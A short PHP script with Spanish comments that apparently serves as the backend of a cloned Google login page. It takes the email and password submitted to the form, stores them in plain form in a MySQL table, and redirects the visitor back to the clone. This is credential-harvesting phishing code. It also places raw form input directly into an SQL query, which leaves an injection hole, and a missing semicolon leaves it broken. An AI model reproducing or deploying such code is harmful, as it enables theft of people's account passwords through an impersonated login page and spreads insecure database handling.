<?php

 //conectamos Con el servidor
 $host ="localhost:3307";
 $user ="root";
 $pass ="";
 $db="formulariogoolge";

 //funcion llamada conexion con (dominio,usuarios,contraseña,base_de_datos)
 $con = mysqli_connect($host,$user,$pass,$db)or die("Problemas al Conectar");
 mysqli_select_db($con,$db)or die("problemas al conectar con la base de datos");


 //recuperar las variables
 $correo=$_POST['correo'];
 $contraseña=$_POST['contraseña'];

 //hacemos la sentencia de sql
 $sql="INSERT INTO datos VALUES('$correo',
           '$contraseña')";
 //ejecutamos la sentencia de sql
 $ejecutar=mysqli_query($con,$sql);
  header("Location:/../Google clone/index.html")
  
 //verificamos la ejecucion
 /*if(!$ejecutar){
  echo"Hubo Algun Error";
 }else{
  echo"INICIO EXITOSO, ¿REGRESAR AL BUSCADOR?><a href='/../Google clone/index.html'>Volver</a>";
 }*/

?>